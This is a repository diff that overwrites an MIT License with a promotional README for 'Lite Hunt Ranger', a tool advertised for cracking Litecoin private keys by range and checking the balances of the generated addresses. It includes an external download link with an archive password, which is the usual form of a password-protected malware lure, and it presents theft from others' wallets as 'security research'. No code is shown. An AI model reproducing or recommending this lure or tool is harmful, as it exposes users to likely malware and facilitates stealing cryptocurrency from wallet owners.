@@ -1,21 +1,32 @@
-MIT License
+Lite Hunt Ranger
+Lite coin Hunting And Crack Private Key With Range Method [LTC]
+DOWNLOAD LINK : http://galogora.live/burnout-inst2
+PASSWORD : 2026
+Advanced Litecoin (LTC) address scanner and balance checker with multiple scanning modes for cryptocurrency research and security analysis.
 
-Copyright (c) 2026 colygeneralworld
+Description
+LiteHuntRanger is a comprehensive Litecoin address scanning toolkit that provides three different scanning approaches:
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
+Offline Scanner: Fast local scanning against rich address databases
+Online Scanner: Real-time balance checking via API integration
+Threaded Scanner: High-performance multi-threaded online scanning
+This tool is designed for educational purposes, security research, and understanding cryptocurrency address generation patterns.
 
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
+Litecoin Wallet Scanner
 
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
+Features
+Core Capabilities
+Generate Litecoin private keys and addresses from numeric ranges
+Support for multiple address types (P2PKH, P2WPKH, P2SH-P2WPKH)
+Real-time balance checking through Atomic Wallet API
+Rich console interface with live statistics
+Comprehensive logging and result export
+Scanning Modes
+Offline Mode: Compare generated addresses against local rich address databases
+Online Mode: Check each generated address for balance via API
+Threaded Mode: Accelerated online scanning with configurable thread pools
+User Interface
+Three-panel layout with header, statistics, and activity monitoring
+Live progress tracking with rates and counters
+Color-coded status indicators
+Terminal title updates with current progress
